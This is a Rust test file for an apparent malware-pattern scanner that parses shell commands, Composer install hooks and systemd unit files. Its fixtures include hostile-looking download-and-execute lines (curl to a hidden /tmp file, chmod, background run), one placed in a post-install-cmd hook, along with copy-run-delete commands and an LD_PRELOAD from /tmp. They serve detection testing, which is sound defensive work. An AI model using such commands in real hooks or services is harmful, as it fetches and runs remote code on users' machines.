use super::*;
use serde_json::json;

#[test]
fn literal_command_flow_requires_matching_paths_and_real_operations() {
    let download = "/bin/sh -c 'curl -skL https://example.test/x -o /tmp/.new-name && chmod +x /tmp/.new-name && /tmp/.new-name &'";
    let flows = literal_shell_flows(download);
    assert_eq!(flows.len(), 1);
    assert_eq!(flows[0]["hidden_temporary"], true);
    assert_eq!(
        literal_shell_flows(&download.replace("&& /tmp/.new-name &'", "&& /tmp/.other &'")).len(),
        0
    );
    assert_eq!(
        literal_shell_flows(&download.replace("-skL", "--help")).len(),
        0
    );
    assert_eq!(
        literal_shell_flows(&download.replace("curl", "echo curl")).len(),
        0
    );
    assert_eq!(
        literal_shell_flows(&download.replace("&& /tmp/.new-name &'", "&& $payload &'")).len(),
        0
    );
    assert_eq!(
        literal_shell_flows(&download[..download.len() - 1]).len(),
        0
    );
    let copy = "/bin/bash -c 'cp -f -r -- /bin/input /bin/temp 2>/dev/null && /bin/temp >/dev/null 2>&1 && rm -rf -- /bin/temp 2>/dev/null'";
    assert_eq!(literal_shell_flows(copy)[0]["kind"], "copy-exec-delete");
    assert_eq!(
        literal_shell_flows(&copy.replace("&& /bin/temp >", "&& /bin/other >")).len(),
        0
    );
    assert_eq!(
        literal_shell_flows(&copy.replace("rm -rf", "rm --help")).len(),
        0
    );
}

#[test]
fn composer_hook_flows_bind_paths_and_preserve_executable_context() {
    let command = "curl -skL https://example.test/x -o /tmp/.changed 2>/dev/null && chmod +x /tmp/.changed && /tmp/.changed &";
    let manifest = serde_json::json!({"scripts":{"post-install-cmd":[command]}});
    let mut values = Values::default();
    super::super::structured::extract_composer_json(
        &serde_json::to_vec(&manifest).unwrap(),
        &mut values,
        &mut Errors::new(),
    )
    .unwrap();
    let flows = values
        .get("composer.install_hook_flows")
        .unwrap()
        .as_array()
        .unwrap();
    assert_eq!(flows.len(), 1);
    assert_eq!(flows[0]["event"], "post-install-cmd");
    assert!(
        flows[0]["curl_options"]
            .as_array()
            .unwrap()
            .contains(&json!("-skL"))
    );
    assert_eq!(flows[0]["download_stderr_target"], "/dev/null");
    for manifest in [
        serde_json::json!({"description":command}),
        serde_json::json!({"scripts":{"test":command}}),
        serde_json::json!({"scripts":{"post-install-cmd":command.replace("&& /tmp/.changed &", "&& /tmp/.other &")}}),
        serde_json::json!({"scripts":{"post-install-cmd":command.replace("curl -skL", "echo curl -skL")}}),
        serde_json::json!({"scripts":{"post-install-cmd":command.replace("-skL", "--help")}}),
        serde_json::json!({"scripts":{"post-install-cmd":["curl -skL https://example.test/x -o /tmp/.changed", "chmod +x /tmp/.changed", "/tmp/.changed &"]}}),
    ] {
        let mut values = Values::default();
        super::super::structured::extract_composer_json(
            &serde_json::to_vec(&manifest).unwrap(),
            &mut values,
            &mut Errors::new(),
        )
        .unwrap();
        assert_eq!(
            values.get("composer.install_hook_flows").unwrap(),
            &serde_json::json!([])
        );
    }
    let manifest = serde_json::json!({"scripts":{"post-update-cmd":command}});
    let mut values = Values::default();
    super::super::structured::extract_composer_json(
        &serde_json::to_vec(&manifest).unwrap(),
        &mut values,
        &mut Errors::new(),
    )
    .unwrap();
    assert_eq!(
        values.get("composer.install_hook_flows").unwrap()[0]["event"],
        "post-update-cmd"
    );
}

#[test]
fn sections_commands_resets_lists_and_continuations() {
    let bytes = b"# ignored\n[Unit]\nDescription=Example\nAfter=network.target syslog.target\n\
            [Install]\nWantedBy=multi-user.target\n[Service]\nUser=root\n\
            ExecStart=/bin/first\nExecStart=\nExecStart=/bin/sh -c \\\n            # continued comment\n  'echo hello'\nEnvironment=\"LABEL=hello world\" HEX=\\x41\n\
            Type=forking\nRestart=always\nKillMode=process\n";
    let mut values = Values::default();
    extract(bytes, &mut values, &mut Errors::new());
    assert_eq!(values.get("service.user"), Some(&json!("root")));
    assert_eq!(
        values.get("service.exec_start"),
        Some(&json!("/bin/sh -c 'echo hello'"))
    );
    assert_eq!(
        values.get("service.environment.LABEL"),
        Some(&json!("hello world"))
    );
    assert_eq!(values.get("service.environment.HEX"), Some(&json!("A")));
    assert_eq!(
        values.get("unit.after"),
        Some(&json!(["network.target", "syslog.target"]))
    );
    assert_eq!(
        values.get("install.wanted_by"),
        Some(&json!("multi-user.target"))
    );
    assert_eq!(values.get("service.kill_mode"), Some(&json!("process")));
    for end in 0..bytes.len() {
        extract(&bytes[..end], &mut Values::default(), &mut Errors::new());
    }
}

#[test]
fn environment_reset_and_raw_tracking() {
    let bytes = br#"
[Service]
Environment="LD_PRELOAD=/tmp/old.so" "URL=https://old.example/payload.sh"
Environment=
Environment="LD_PRELOAD=/tmp/new.so" PATH=/tmp/bin
ExecStart=/bin/old
ExecStart=
ExecStart=/bin/new
"#;
    let mut values = Values::default();
    extract(bytes, &mut values, &mut Errors::new());
    assert_eq!(
        values.get("service.environment.LD_PRELOAD"),
        Some(&json!("/tmp/new.so"))
    );
    // `Environment=` clears what came before it.
    assert_eq!(values.get("service.environment.URL"), None);
    assert_eq!(
        values.get("service.environment_list"),
        Some(&json!(["LD_PRELOAD=/tmp/new.so", "PATH=/tmp/bin"]))
    );
    assert_eq!(
        values.get("service._raw.environment"),
        Some(&json!("\"LD_PRELOAD=/tmp/new.so\" PATH=/tmp/bin"))
    );
    assert_eq!(values.get("service.exec_start"), Some(&json!("/bin/new")));
    assert_eq!(
        values.get("service._raw.exec_start"),
        Some(&json!("/bin/new"))
    );
}

#[test]
fn escaped_items_quoted_paths_and_semicolon_comments() {
    let bytes = br#"
; leading comment
[Service]
ReadOnlyPaths=/opt/my\sdir "/srv/quoted path"
Environment='GREETING=hello world' PATH=/tmp/my\sbin
ExecStartPre=/bin/echo start \
; comment inside continued block
  done
ReadWritePaths=/etc/systemd/system /tmp
"#;
    let mut values = Values::default();
    extract(bytes, &mut values, &mut Errors::new());
    assert_eq!(
        values.get("service.read_only_paths"),
        Some(&json!(["/opt/my dir", "/srv/quoted path"]))
    );
    assert_eq!(
        values.get("service.environment.GREETING"),
        Some(&json!("hello world"))
    );
    assert_eq!(
        values.get("service.environment.PATH"),
        Some(&json!("/tmp/my bin"))
    );
    assert_eq!(
        values.get("service.environment_list"),
        Some(&json!(["GREETING=hello world", "PATH=/tmp/my bin"]))
    );
    assert_eq!(
        values.get("service.exec_start_pre"),
        Some(&json!("/bin/echo start done"))
    );
    assert_eq!(
        values.get("service.read_write_paths"),
        Some(&json!(["/etc/systemd/system", "/tmp"]))
    );
}
